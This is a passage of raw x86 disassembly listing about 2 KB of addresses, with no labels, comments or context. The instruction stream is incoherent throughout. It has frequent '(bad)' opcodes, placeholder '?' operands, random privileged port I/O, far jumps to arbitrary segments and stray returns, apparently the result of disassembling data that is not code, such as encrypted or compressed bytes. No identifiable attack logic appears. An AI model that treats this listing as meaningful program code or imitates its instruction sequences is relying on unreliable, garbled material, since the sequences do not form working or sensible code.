  414ecd:	lds    ebp,FWORD PTR ds:0x2435e051
  414ed3:	(bad)  
  414ed4:	jmp    0x1d49f605
  414ed9:	outs   dx,BYTE PTR ds:[esi]
  414eda:	fucomp st(2)
  414edc:	xchg   ebx,eax
  414edd:	loop   0x414edb
  414edf:	push   0xf715dae2
  414ee4:	pop    edx
  414ee5:	sbb    dl,BYTE PTR [ebx+ecx*4]
  414ee8:	repz out dx,eax
  414eea:	jo     0x414ee6
  414eec:	cmp    eax,0x7d15cecd
  414ef1:	mov    edi,0x794f1754
  414ef6:	aaa    
  414ef7:	cmc    
  414ef8:	push   cs
  414ef9:	pop    eax
  414efa:	jne    0x414ef8
  414efc:	pop    ebx
  414efd:	jecxz  0x414f08
  414eff:	idiv   dl
  414f01:	mov    ah,0xa7
  414f03:	adc    BYTE PTR [ebp-0x6b],ch
  414f06:	rcr    BYTE PTR [esi+0x22],0x35
  414f0a:	ret    
  414f0b:	jg     0x414f2b
  414f0d:	push   ebp
  414f0e:	cmp    esi,DWORD PTR [esi]
  414f10:	div    DWORD PTR [ebx+0x5b7d90a9]
  414f16:	ss pusha 
  414f18:	mov    cl,0x57
  414f1a:	cmp    al,BYTE PTR [ebp-0x60]
  414f1d:	add    al,0x1a
  414f1f:	jnp    0x414ee9
  414f21:	out    dx,eax
  414f22:	clc    
  414f23:	xchg   ecx,eax
  414f24:	sbb    al,0x74
  414f26:	test   al,0x54
  414f28:	in     al,0x15
  414f2a:	cwde   
  414f2b:	sub    BYTE PTR [ebx],0x9a
  414f2e:	push   edx
  414f2f:	out    dx,al
  414f30:	pop    ss
  414f31:	ficomp WORD PTR [esi]
  414f33:	push   edi
  414f34:	sbb    al,0x4d
  414f36:	stc    
  414f37:	mov    ecx,0x2a22416d
  414f3c:	lods   al,BYTE PTR ds:[esi]
  414f3d:	test   al,0x98
  414f3f:	fsub   QWORD PTR [eax+0x38e76d6]
  414f45:	cmp    al,0x57
  414f47:	adc    esp,esi
  414f49:	adc    BYTE PTR [esi+0x7e],0xf
  414f4d:	xchg   DWORD PTR [ebx],ecx
  414f4f:	mov    eax,0xd08021ab
  414f54:	(bad)  
  414f55:	mov    esi,esi
  414f57:	mov    cl,0xe7
  414f59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f5a:	inc    esp
  414f5b:	push   ebp
  414f5c:	inc    ebp
  414f5d:	fdivr  QWORD PTR [edi+eiz*8+0x52bb72f5]
  414f64:	out    dx,al
  414f65:	inc    esi
  414f66:	mov    dh,0x77
  414f68:	jb     0x414f63
  414f6a:	adc    bh,dh
  414f6c:	in     eax,dx
  414f6d:	adc    al,0xb6
  414f6f:	daa    
  414f70:	sub    bp,WORD PTR [ebx]
  414f73:	dec    edx
  414f74:	in     al,dx
  414f75:	addr16 sub eax,0xa31571f8
  414f7b:	dec    edi
  414f7c:	sbb    bh,BYTE PTR [edx+0x5cea60d3]
  414f82:	aam    0x77
  414f84:	mov    WORD PTR [ebx],?
  414f86:	in     al,dx
  414f87:	jmp    0xc51a:0x2bc13f36
  414f8e:	mov    bl,0x8
  414f90:	push   esp
  414f91:	lods   al,BYTE PTR ds:[esi]
  414f92:	in     eax,0xbd
  414f94:	mov    bh,BYTE PTR [ecx-0x47]
  414f97:	jbe    0x414fec
  414f99:	in     eax,dx
  414f9a:	push   esp
  414f9b:	dec    edi
  414f9c:	enter  0xbd73,0xb1
  414fa0:	mov    gs,WORD PTR [ecx-0x79]
  414fa3:	mov    dl,BYTE PTR [ebp+0x1c]
  414fa6:	and    BYTE PTR [edi],bl
  414fa8:	cld    
  414fa9:	ret    0xdd8e
  414fac:	in     eax,0xed
  414fae:	and    al,0xfc
  414fb0:	cmp    eax,0xf265b5d9
  414fb5:	sbb    eax,0x266d384a
  414fba:	pop    edx
  414fbb:	pmaxsw mm5,QWORD PTR [edx-0x45]
  414fbf:	cmc    
  414fc0:	cli    
  414fc1:	shr    ecx,1
  414fc3:	mov    DWORD PTR gs:[edi],edx
  414fc6:	loop   0x415044
  414fc8:	inc    edx
  414fc9:	push   es
  414fca:	stc    
  414fcb:	test   eax,0x9e011839
  414fd0:	xchg   edi,eax
  414fd1:	mov    ds:0x537b3e09,eax
  414fd6:	out    dx,eax
  414fd7:	aam    0x97
  414fd9:	and    bl,BYTE PTR [edi-0x6e4ccc25]
  414fdf:	mov    WORD PTR [eax+0x45024d9f],ds
  414fe5:	xor    eax,0x44bcea27
  414fea:	jecxz  0x41505b
  414fec:	adc    esp,DWORD PTR [esp+edi*4+0x3e21f2b4]
  414ff3:	aas    
  414ff4:	and    dh,BYTE PTR [edi-0x34d6c95e]
  414ffa:	dec    ecx
  414ffb:	add    BYTE PTR [edi+eax*8],bl
  414ffe:	in     eax,0x10
  415000:	ins    BYTE PTR es:[edi],dx
  415001:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415002:	add    bl,cl
  415004:	sub    BYTE PTR [edi-0x52bc3ce7],bl
  41500a:	add    al,0x9c
  41500c:	jmp    0xee5d:0xaa8bd507
  415013:	or     DWORD PTR [esi+esi*2-0x68ed043c],0xcb8ca29c
  41501e:	mov    ah,0xf6
  415020:	jecxz  0x415051
  415022:	sub    esi,DWORD PTR [ebp-0x20f89734]
  415028:	dec    ecx
  415029:	into   
  41502a:	mov    bl,0xaa
  41502c:	xchg   ecx,eax
  41502d:	mov    ds:0x12a6176c,al
  415032:	imul   BYTE PTR [ebp+eiz*8-0x3]
  415036:	pop    eax
  415037:	add    ch,BYTE PTR [edx-0x6ae503f4]
  41503d:	cli    
  41503e:	jne    0x41501a
  415040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415041:	ins    BYTE PTR es:[edi],dx
  415042:	jle    0x4150a7
  415044:	int3   
  415045:	xor    ebp,eax
  415047:	pop    edx
  415048:	loop   0x415024
  41504a:	sar    BYTE PTR [edx],0x20
  41504d:	in     al,0x89
  41504f:	adc    BYTE PTR [ebx-0x4c5ebfd1],cl
  415055:	retf   
  415056:	xor    BYTE PTR [edx],ah
  415058:	add    BYTE PTR [esi],al
  41505a:	or     DWORD PTR [edi],edi
  41505c:	fs push edx
  41505e:	inc    edx
  41505f:	sbb    bl,ch
  415061:	aam    0xbe
  415063:	scas   eax,DWORD PTR es:[edi]
  415064:	xor    BYTE PTR [ebp+0x3e4f8c93],ah
  41506a:	mov    esi,0xa148bdc8
  41506f:	mov    edx,0x519b7f7e
  415074:	cld    
  415075:	mov    WORD PTR [edx+0x5a],?
  415078:	(bad)  
  415079:	lds    esp,FWORD PTR [edi-0x63e48c34]
  41507f:	dec    ebp
  415080:	ret    0x7193
  415083:	xchg   edi,eax
  415084:	jle    0x4150d3
  415086:	jg     0x4150b3
  415088:	mov    edi,0x3cd469bd
  41508d:	push   esp
  41508e:	cdq    
  41508f:	cmp    al,BYTE PTR [edi-0x12]
  415092:	in     al,dx
  415093:	(bad)  
  415094:	mov    cl,0x46
  415096:	xchg   esp,eax
  415097:	(bad)  
  415098:	and    dh,BYTE PTR [eax+0x471b3f73]
  41509e:	inc    DWORD PTR [eax]
  4150a0:	rol    BYTE PTR [ebx+edx*1],1
  4150a3:	adc    eax,0xc55b43ed
  4150a8:	push   0xfffffffc
  4150aa:	add    cl,dl
  4150ac:	retf   0x7946
  4150af:	push   ds
  4150b0:	pop    ecx
  4150b1:	push   ebx
  4150b2:	mov    bl,0x27
  4150b4:	mov    esi,0x219517f
  4150b9:	out    0x41,eax
  4150bb:	das    
  4150bc:	ret    
  4150bd:	out    0xe1,eax
  4150bf:	mov    bl,0xe2
  4150c1:	xchg   ebx,eax
  4150c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150c3:	jge    0x415071
  4150c5:	jg     0x4150d4
  4150c7:	ins    BYTE PTR es:[edi],dx
  4150c8:	jmp    0x415064
  4150ca:	cmp    ebx,esi
  4150cc:	cmp    ch,al
  4150ce:	leave  
  4150cf:	fnsave [edx+esi*8]
  4150d2:	enter  0x9ab1,0xbe
  4150d6:	push   ebx
  4150d7:	test   al,0x54
  4150d9:	inc    esi
  4150da:	ins    BYTE PTR es:[edi],dx
  4150db:	out    0xc5,eax
  4150dd:	addr16 cwde 
  4150df:	rcr    dl,1
  4150e1:	das    
  4150e2:	jno    0x41507e
  4150e4:	leave  
  4150e5:	pop    ecx
  4150e6:	pusha  
  4150e7:	test   eax,0xed2260b8
  4150ec:	fistp  DWORD PTR [ebx+eiz*1-0x21c2627f]
  4150f3:	inc    ebp
  4150f4:	jp     0x4150f3
  4150f6:	fsubr  QWORD PTR [edi-0x6c]
  4150f9:	jno    0x415104
  4150fb:	test   al,0xb4
  4150fd:	sbb    cl,dl
  4150ff:	mov    ebp,0xcfc8a3a9
  415104:	outs   dx,BYTE PTR ds:[esi]
  415105:	jo     0x41509a
  415107:	xor    BYTE PTR [edi+ebx*1],dl
  41510a:	div    DWORD PTR es:[eax+ecx*8-0x29f36874]
  415112:	add    bh,BYTE PTR [edi+edx*8-0x517096d0]
  415119:	mov    esi,0x43cd1630
  41511e:	mov    al,ds:0xffdef400
  415123:	and    al,BYTE PTR [ebx+esi*2+0x6]
  415127:	pop    ds
  415128:	sbb    DWORD PTR [edx],ebx
  41512a:	mov    bl,0xa8
  41512c:	mov    edx,0x2c9afb4f
  415131:	mov    ebp,DWORD PTR [ebx+0x27]
  415134:	call   0x9c777168
  415139:	test   eax,0x711b55
  41513e:	or     edx,DWORD PTR [eax-0x745d8c64]
  415144:	in     eax,0x95
  415146:	cmp    edi,ecx
  415148:	sar    DWORD PTR [ebx+0x26a94b13],1
  41514e:	mov    edi,0x2f7b35
  415153:	push   edi
  415154:	ja     0x4151d3
  415156:	sti    
  415157:	jmp    0x41a7:0x65c14439
  41515e:	out    0x80,al
  415160:	sub    esp,edx
  415162:	jbe    0x415109
  415164:	xchg   ebp,eax
  415165:	pop    ebx
  415166:	mov    edi,0x13bc65ac
  41516b:	in     eax,dx
  41516c:	mov    BYTE PTR [esi+ecx*8+0x23],ch
  415170:	sub    edx,edi
  415172:	daa    
  415173:	popa   
  415174:	repnz rcr DWORD PTR [edx],1
  415177:	push   cs
  415178:	or     DWORD PTR [ebx-0x58ae69f8],0x61c27cc9
  415182:	shl    edx,1
  415184:	xchg   edx,eax
  415185:	jl     0x4151c0
  415187:	mov    cl,0x17
  415189:	pop    esi
  41518a:	mov    al,es:0x89d811cd
  415190:	adc    eax,0x269b64a8
  415195:	inc    edi
  415196:	jg     0x415123
  415198:	lds    ebp,FWORD PTR [ebx-0x73e25ac6]
  41519e:	jecxz  0x415140
  4151a0:	jl     0x41517b
  4151a2:	rcr    ch,1
  4151a4:	inc    esi
  4151a5:	cli    
  4151a6:	fs ffreep st(3)
  4151a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151aa:	test   al,0x84
  4151ac:	stos   DWORD PTR es:[edi],eax
  4151ad:	push   cs
  4151ae:	lea    ecx,[ebp+0x4bf1f23d]
  4151b4:	adc    eax,0x8fa1f02f
  4151b9:	adc    BYTE PTR ds:0xf4ded42c,dl
  4151bf:	mov    ch,BYTE PTR [edi+0x26d16206]
  4151c5:	jne    0x4151b1
  4151c7:	sub    dh,BYTE PTR [ebp+0x1ed2b718]
  4151cd:	lea    eax,[ecx-0x7f810402]
  4151d3:	adc    eax,0x4935c5a6
  4151d8:	dec    esp
  4151d9:	xor    bl,BYTE PTR [ebx+eax*8+0x6c]
  4151dd:	loop   0x4151fd
  4151df:	repnz daa 
  4151e1:	test   BYTE PTR [esi-0x61d17a4a],dh
  4151e7:	pushf  
  4151e8:	mov    edx,0xa4e74354
  4151ed:	dec    ebp
  4151ee:	das    
  4151ef:	mov    WORD PTR [ebp-0x20],es
  4151f2:	das    
  4151f3:	ret    
  4151f4:	push   ebp
  4151f5:	xor    ecx,DWORD PTR [esp+ebp*1]
  4151f8:	jmp    0x72a23308
  4151fd:	xchg   BYTE PTR [edi],al
  4151ff:	cmp    DWORD PTR [edi-0x4b8752fa],edx
  415205:	dec    ecx
  415206:	adc    edi,DWORD PTR [ebp-0x31f16fc1]
  41520c:	int    0xa3
  41520e:	mov    cl,BYTE PTR [edx]
  415210:	cwde   
  415211:	lock mov esp,0x37606411
  415217:	adc    ebp,DWORD PTR [ebp+ebx*2+0x27a6ea30]
  41521e:	loop   0x415278
  415220:	sbb    dh,bh
  415222:	xchg   edi,eax
  415223:	enter  0x5287,0x47
  415227:	loope  0x415292
  415229:	mov    bl,0xc7
  41522b:	push   es
  41522c:	lea    ebp,[edx]
  41522e:	hlt    
  41522f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415230:	xchg   DWORD PTR [edx],esi
  415232:	mov    ecx,0xfd54351a
  415237:	in     eax,0x84
  415239:	aad    0x1
  41523b:	jno    0x4151e5
  41523d:	dec    edx
  41523e:	mov    edi,0xa99c6ac8
  415243:	cmc    
  415244:	aam    0x27
  415246:	mov    ebp,0x8ad28be4
  41524b:	retf   
  41524c:	ret    
  41524d:	jle    0x415230
  41524f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415250:	shr    DWORD PTR [edx+edi*8+0x772bd491],cl
  415257:	jg     0x415244
  415259:	jmp    0x78af:0xe9d3fb11
  415260:	das    
  415261:	push   esp
  415262:	mov    ecx,0xdb593295
  415267:	popa   
  415268:	daa    
  415269:	stos   BYTE PTR es:[edi],al
  41526a:	xchg   ebx,edi
  41526c:	pop    esi
  41526d:	in     al,dx
  41526e:	daa    
  41526f:	(bad)  
  415270:	repz mov dh,0x8d
  415273:	std    
  415274:	dec    DWORD PTR [ebx+0x1c817185]
  41527a:	sbb    al,BYTE PTR [edi-0x76]
  41527d:	mov    dh,0xa1
  41527f:	pop    esp
  415280:	ret    
  415281:	fcom   st(5)
  415283:	aaa    
  415284:	fwait
  415285:	(bad)  
  415286:	fucomi st,st(3)
  415288:	mov    dl,0x8a
  41528a:	inc    ebx
  41528b:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41528d:	jns    0x415240
  41528f:	add    esp,esp
  415291:	(bad)  
  415293:	dec    edx
  415294:	bound  edx,QWORD PTR [edx-0x465dbce8]
  41529a:	scas   al,BYTE PTR es:[edi]
  41529b:	xchg   BYTE PTR [ebp+0x54],cl
  41529e:	fsub   QWORD PTR [eax-0x1119b16c]
  4152a4:	imul   BYTE PTR [ebp+ecx*1-0xa048a2]
  4152ab:	daa    
  4152ac:	xor    BYTE PTR [edx],dh
  4152ae:	test   BYTE PTR [ecx+eiz*1+0x4b303fa6],0xe3
  4152b6:	out    dx,al
  4152b7:	das    
  4152b8:	mov    al,0x5b
  4152ba:	pop    ebp
  4152bb:	push   ebp
  4152bc:	lahf   
  4152bd:	scas   al,BYTE PTR es:[edi]
  4152be:	repz (bad) 
  4152c0:	out    dx,al
  4152c1:	inc    eax
  4152c2:	ins    BYTE PTR es:[edi],dx
  4152c3:	mov    al,BYTE PTR [ebx-0x64]
  4152c6:	(bad)  
  4152c7:	ret    0x8bd7
  4152ca:	aam    0xfa
  4152cc:	ins    BYTE PTR es:[edi],dx
  4152cd:	mov    ebp,0x41f77a43
  4152d2:	add    eax,0x93245563
  4152d7:	mov    ds:0xa1937ae1,eax
  4152dc:	or     ah,BYTE PTR [ebx-0x70]
  4152df:	xchg   esi,eax
  4152e0:	sbb    BYTE PTR [eax],cl
  4152e2:	mov    ch,0x17
  4152e4:	cmp    BYTE PTR [ebx+0xe2d2910],ah
  4152ea:	arpl   WORD PTR [edi+edi*1+0x675ce0c8],di
  4152f1:	xor    eax,0x7e95c65b
  4152f6:	mov    cl,ah
  4152f8:	jnp    0x4152e3
  4152fa:	inc    esp
  4152fb:	sub    DWORD PTR [ebp-0x200352fd],0xcf9dc519
  415305:	mov    BYTE PTR [ebx-0x43d77021],cl
  41530b:	mov    bl,0xf6
  41530d:	cmp    eax,0x5f61c3c8
  415312:	mov    bh,0xbb
  415314:	mov    eax,ds:0x1505b33c
  415319:	jo     0x41529d
  41531b:	pop    es
  41531c:	into   
  41531d:	pushf  
  41531e:	ret    
  41531f:	mov    ds,eax
  415321:	xchg   DWORD PTR [ebp+0x1a],esp
  415324:	adc    eax,0xc64c31a4
  415329:	dec    esp
  41532a:	mov    edx,0x53a26a14
  41532f:	pop    ebx
  415330:	and    edi,DWORD PTR [ebp+0x74274003]
  415336:	inc    esp
  415337:	xor    al,BYTE PTR [esi]
  415339:	imul   ecx,DWORD PTR [esi+ecx*1],0x57
  41533d:	mov    BYTE PTR [esi+ebp*4],dh
  415340:	sub    BYTE PTR [ebx+0x3abd288c],bl
  415346:	add    BYTE PTR [ebx],cl
  415348:	lods   eax,DWORD PTR ds:[esi]
  415349:	mov    edx,0x111ae51c
  41534e:	pop    esp
  41534f:	sbb    ebx,DWORD PTR [esi-0x7]
  415352:	jecxz  0x4153bd
  415354:	jno    0x4152ec
  415356:	or     esi,ecx
  415358:	jle    0x415357
  41535a:	jnp    0x415348
  41535c:	(bad)
  41535f:	mul    BYTE PTR [ecx+0x28]
  415362:	(bad)  
  415364:	pop    esi
  415365:	jns    0x41533d
  415367:	retf   
  415368:	push   edx
  415369:	aam    0x69
  41536b:	mov    ebp,0x6b9e1fc6
  415370:	dec    edx
  415371:	push   cs
  415372:	adc    DWORD PTR [edi],esi
  415374:	push   edx
  415375:	fs popa 
  415377:	dec    esp
  415378:	fstp   TBYTE PTR cs:[ebx+0xe317075]
  41537f:	and    edx,DWORD PTR [ebp-0x63]
  415382:	pusha  
  415383:	sbb    al,0x92
  415385:	mov    bl,0xe2
  415387:	push   ds
  415388:	ret    0x259a
  41538b:	int3   
  41538c:	pop    edi
  41538d:	and    ah,BYTE PTR [edi+ecx*4+0x4334d6e1]
  415394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415395:	jnp    0x41540d
  415397:	and    al,0x8a
  415399:	jle    0x415387
  41539b:	adc    al,0xe2
  41539d:	sti    
  41539e:	mov    bh,0xf5
  4153a0:	jne    0x4153dc
  4153a2:	inc    edx
  4153a3:	adc    al,0x3
  4153a5:	cli    
  4153a6:	ins    DWORD PTR es:[edi],dx
  4153a7:	test   DWORD PTR ds:0x603ba236,ecx
  4153ad:	sbb    BYTE PTR [ecx],0x63
  4153b0:	sahf   
  4153b1:	shl    DWORD PTR [edx-0x5ce98f08],cl
  4153b7:	imul   eax,DWORD PTR [eax-0x39],0x1e971cd
  4153be:	daa    
  4153bf:	and    DWORD PTR [esi+0x5],0xffffffea
  4153c3:	cmp    ah,BYTE PTR [esi]
  4153c5:	out    dx,eax
  4153c6:	cli    
  4153c7:	sub    ebp,edi
  4153c9:	add    eax,0x98c1c91f
  4153ce:	pusha  
  4153cf:	neg    BYTE PTR [ebx+0x908c8c]
  4153d5:	fwait
  4153d6:	cmp    BYTE PTR [ebp+0x22],ah
  4153d9:	sub    DWORD PTR [edx-0x6e],0x51
  4153dd:	inc    esp
  4153df:	repz int3 
  4153e1:	push   ebp
  4153e2:	in     eax,0x3e
  4153e4:	(bad)  
  4153e5:	pop    ds
  4153e6:	sub    al,0x98
  4153e8:	fidiv  WORD PTR [ebx+0x7]
  4153eb:	cmc    
  4153ec:	push   es
  4153ed:	sub    al,0x97
  4153ef:	add    DWORD PTR [ebx+0x1a],edx
  4153f2:	push   0x3b
  4153f4:	ds stc 
  4153f6:	jg     0x41543e
  4153f8:	std    
  4153f9:	fcomp  QWORD PTR [edx]
  4153fb:	fwait
  4153fc:	mov    edi,0x3156f23e
  415401:	(bad)  
  415402:	out    dx,eax
  415403:	daa    
  415404:	(bad)  
  415405:	int    0x7f
  415407:	test   eax,0x8510c4bd
  41540c:	dec    eax
  41540d:	mov    eax,ds:0x71a43c37
  415412:	mov    dh,0x73
  415414:	jno    0x415479
  415416:	inc    eax
  415417:	inc    ebx
  415418:	push   eax
  415419:	push   esi
  41541a:	mov    DWORD PTR [eax+ecx*8],esi
  41541d:	iret   
  41541e:	inc    edi
  41541f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415420:	cdq    
  415421:	or     eax,0x65b717fb
  415426:	aaa    
  415427:	cmp    al,0x65
  415429:	xchg   edx,eax
  41542a:	cmp    eax,0x584a246
  41542f:	fadd   DWORD PTR [eax+0x6b]
  415432:	cli    
  415433:	ror    BYTE PTR [eax],1
  415435:	mov    ?,WORD PTR [ebp+0x2db5b0b6]
  41543b:	in     eax,0xa8
  41543d:	or     eax,0xff26d482
  415442:	add    eax,0xcfeeb7f
  415447:	fidiv  DWORD PTR [eax]
  415449:	add    edx,DWORD PTR [edi]
  41544b:	cmp    dl,BYTE PTR [edx+0x41c3b47]
  415451:	or     BYTE PTR [edi+esi*1+0x6a],0x8d
  415456:	mov    ebp,0xc92f2ba2
  41545b:	mov    bl,0x99
  41545d:	adc    ebp,DWORD PTR [ebp+0x2d621ff3]
  415463:	cmp    DWORD PTR [ebp-0x16],edi
  415466:	dec    ebx
  415467:	adc    al,BYTE PTR [ebx]
  415469:	outs   dx,BYTE PTR ds:[esi]
  41546a:	jp     0x4154c0
  41546c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41546d:	pop    ss
  41546e:	cmp    ecx,DWORD PTR [ebx]
  415470:	ss or  esi,0x12a3846d
  415477:	outs   dx,DWORD PTR ds:[esi]
  415478:	mov    ah,0x34
  41547a:	sar    DWORD PTR [edi-0x46],0x6f
  41547e:	(bad)  
  41547f:	enter  0x63f4,0x8d
  415483:	add    BYTE PTR [edi],al
  415485:	int3   
  415486:	mov    ah,0x34
  415488:	xor    eax,0x6faf427e
  41548d:	pop    ss
  41548e:	push   ebx
  41548f:	xor    edx,ecx
  415491:	cld    
  415492:	pusha  
  415493:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415494:	shl    BYTE PTR [ebx],0xdd
  415497:	ins    DWORD PTR es:[edi],dx
  415498:	inc    edx
  415499:	stc    
  41549a:	mov    ss,WORD PTR [eax-0x5b7a1924]
  4154a0:	lods   eax,DWORD PTR ds:[esi]
  4154a1:	ins    BYTE PTR es:[edi],dx
  4154a2:	cmovl  edx,DWORD PTR [ebx+eax*8-0x12f22843]
  4154aa:	ret    0x1622
  4154ad:	pop    ebp
  4154ae:	dec    edx
  4154af:	out    dx,eax
  4154b0:	mov    ebp,0x5ceffa8a
  4154b5:	cmc    
  4154b6:	xlat   BYTE PTR ds:[ebx]
  4154b7:	pop    esi
  4154b8:	popa   
  4154b9:	xor    al,0xa9
  4154bb:	jno    0x415534
  4154bd:	fcmovnb st,st(0)
  4154bf:	inc    ecx
  4154c0:	dec    ebp
  4154c1:	in     al,0x7
  4154c3:	test   eax,0x588dd0bc
  4154c8:	push   es
  4154c9:	lock test eax,0x36120dfe
  4154cf:	push   0x43
  4154d1:	push   edi
  4154d2:	inc    edx
  4154d3:	push   ebp
  4154d4:	mov    esi,0xe133e534
  4154d9:	pop    eax
  4154da:	test   dl,al
  4154dc:	sub    eax,0x6702a42
  4154e1:	into   
  4154e2:	out    dx,al
  4154e3:	nop
  4154e4:	imul   ecx,ecx,0x41e14985
  4154ea:	mov    ebx,0x45d463a5
  4154ef:	cwde   
  4154f0:	das    
  4154f1:	jge    0x41555c
  4154f3:	jo     0x41550d
  4154f5:	fiadd  DWORD PTR [ecx-0x6138785e]
  4154fb:	sbb    cl,BYTE PTR [edi-0x4d]
  4154fe:	mov    DWORD PTR [esi+0x7e],esi
  415501:	popa   
  415502:	(bad)  [edx]
  415504:	mov    cl,0x12
  415506:	inc    eax
  415507:	dec    edi
  415508:	and    eax,0xa891ef84
  41550d:	sbb    eax,0x1040c99
  415512:	xor    ah,BYTE PTR [ecx-0x7dabba20]
  415518:	jge    0x41552d
  41551a:	fld    QWORD PTR [edx+0x62f50a63]
  415520:	cmp    edi,edx
  415522:	and    BYTE PTR [edi+esi*4+0xb],cl
  415526:	ins    BYTE PTR es:[edi],dx
  415527:	and    DWORD PTR ds:0x4b72bb63,ecx
  41552d:	adc    BYTE PTR [edi],0xa5
  415530:	pop    ds
  415531:	xchg   ebx,eax
  415532:	cdq    
  415533:	popa   
  415534:	int    0x2e
  415536:	hlt    
  415537:	test   DWORD PTR [eax*1+0x11d9ead],edx
  41553e:	leave  
  41553f:	out    0xd7,al
  415541:	and    BYTE PTR [eax-0x37],dl
  415544:	test   DWORD PTR [ecx+0x41],edi
  415547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415548:	cmp    cl,BYTE PTR [edi-0x17]
  41554b:	test   al,bh
  41554d:	aaa    
  41554e:	in     al,0x40
  415550:	retf   0x3490
  415553:	pop    es
  415554:	jnp    0x41550b
  415556:	scas   eax,DWORD PTR es:[edi]
  415557:	(bad)  
  415558:	jmp    0x4155a4
  41555a:	scas   eax,DWORD PTR es:[edi]
  41555b:	sbb    eax,0xf02682f2
  415560:	shl    DWORD PTR ds:0x5ca716ae,0xf4
  415567:	bound  edi,QWORD PTR [ecx]
  415569:	inc    edi
  41556a:	imul   BYTE PTR [esi]
  41556c:	xchg   DWORD PTR gs:[ecx+ebx*1+0x7f],ebx
  415571:	add    DWORD PTR [esi-0x2fd1da4f],0xffffffdf
  415578:	push   edi
  415579:	jge    0x41554c
  41557b:	aad    0xcb
  41557d:	rol    BYTE PTR [edi-0x4b53d4b8],1
  415583:	xor    cl,0x8c
  415586:	mov    edi,0xc752b686
  41558b:	and    esi,DWORD PTR [eax+0x6e15cd38]
  415591:	std    
  415592:	out    dx,al
  415593:	repnz mov ds:0xf0f43fd9,eax
  415599:	inc    eax
  41559a:	mov    ds:0x4c44486e,eax
  41559f:	push   cs
  4155a0:	cwde   
  4155a1:	pushf  
  4155a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155a3:	rol    bh,0x6d
  4155a6:	lds    eax,FWORD PTR [edi-0x4d1ec8a4]
  4155ac:	add    edx,ebp
  4155ae:	mov    bh,0xad
  4155b0:	popa   
  4155b1:	pop    esi
  4155b2:	push   ss
  4155b3:	arpl   bx,dx
  4155b5:	cs push edi
  4155b7:	fadd   st(1),st
  4155b9:	in     al,dx
  4155ba:	out    0xa9,eax
  4155bc:	mov    edi,0xaad638f2
  4155c1:	add    edx,DWORD PTR [eax+0x30d3cc3]
  4155c7:	xchg   ecx,edx
  4155c9:	ins    DWORD PTR es:[edi],dx
  4155ca:	xchg   esp,eax
  4155cb:	cmp    al,0x2a
  4155cd:	pop    ss
  4155ce:	dec    ebp
  4155cf:	or     BYTE PTR ds:0xfd648f47,bh
  4155d5:	jbe    0x415608
  4155d7:	mov    edi,0x64834a5c
  4155dc:	mov    eax,ds:0xdd80689
  4155e1:	inc    ebx
  4155e2:	aad    0xb9
  4155e4:	push   ecx
  4155e5:	rcl    esp,0xd6
  4155e8:	mov    ebx,0x2fc57ece
  4155ed:	or     dl,0xd9
  4155f0:	out    0xf2,eax
  4155f2:	loop   0x41566d
  4155f4:	rcr    DWORD PTR [eax],0x19
  4155f7:	mov    al,0x58
  4155f9:	pop    ss
  4155fa:	xchg   ecx,eax
  4155fb:	push   ebx
  4155fc:	push   0x230cd209
  415601:	xchg   edi,eax
  415602:	nop
  415603:	add    eax,0xe86e37ef
  415608:	ins    DWORD PTR es:[edi],dx
  415609:	mov    ebp,0xd6fa66ac
  41560e:	sahf   
  41560f:	dec    ebp
  415610:	fisub  DWORD PTR [ebx-0x218fade0]
  415616:	arpl   WORD PTR [esi+0x5b],ax
  415619:	cmp    eax,0x10c002b4
  41561e:	loop   0x415677
  415620:	add    BYTE PTR [ebp+edx*2-0x29],bh
  415624:	mov    ebx,0x61b70b8b
  415629:	mov    bh,0x3a
  41562b:	mov    al,ds:0xc7b2214a
  415630:	sbb    DWORD PTR [edx+0x2662c7fc],esp
  415636:	xchg   ebp,eax
  415637:	add    eax,0x84b777cc
  41563c:	push   0x51
  41563e:	out    0x26,al
  415640:	add    DWORD PTR [ebx+ecx*2],esp
  415643:	push   ecx
  415644:	inc    eax
  415645:	idiv   BYTE PTR [edx]
  415647:	and    DWORD PTR [esi+0x15],edi
  41564a:	mov    ebp,0x74f5c9c4
  41564f:	aam    0x5d
  415651:	pop    esp
  415652:	addr16 jmp 0x842c951e
  415658:	jge    0x41565c
  41565a:	dec    esi
  41565b:	mov    dh,0x9
  41565d:	test   BYTE PTR es:[ebp+eax*8+0x40e52406],0x84
  415666:	bound  ecx,QWORD PTR [edi]
  415668:	inc    esi
  415669:	mov    ah,0xf8
  41566b:	das    
  41566c:	rol    BYTE PTR [edx],cl
  41566e:	imul   ebx,esi,0xffffffbc
  415671:	dec    edx
  415672:	(bad)  
  415673:	xlat   BYTE PTR ds:[ebx]
  415674:	into   
  415675:	std    
  415676:	jmp    0xb43c:0x77111bc3
  41567d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41567e:	or     bh,BYTE PTR [edx+0x893459b]
  415684:	daa    
  415685:	cli    
  415686:	and    DWORD PTR [ebx+0x3a778701],ebx
  41568c:	jae    0x4156d2
  41568e:	jae    0x4156c3
  415690:	ret    0x6fdb
  415693:	(bad)  
  415694:	jecxz  0x415687
  415696:	ret    0xf948
  415699:	call   DWORD PTR [edx-0x56b2a92c]
  41569f:	in     al,dx
  4156a0:	mov    al,cl
  4156a2:	push   cs
  4156a3:	fcmovne st,st(7)
  4156a5:	in     eax,0xa2
  4156a7:	popa   
  4156a8:	mov    ds:0x766668c4,eax
  4156ad:	(bad)  
  4156ae:	rol    BYTE PTR [ecx],1
  4156b0:	mov    ch,BYTE PTR cs:0x5479983a
  4156b7:	sti    
  4156b8:	adc    al,0xb1
  4156ba:	loope  0x415660
  4156bc:	xchg   DWORD PTR [ebx],esp
  4156be:	jl     0x4156c3
  4156c0:	push   ebp
  4156c1:	dec    esp
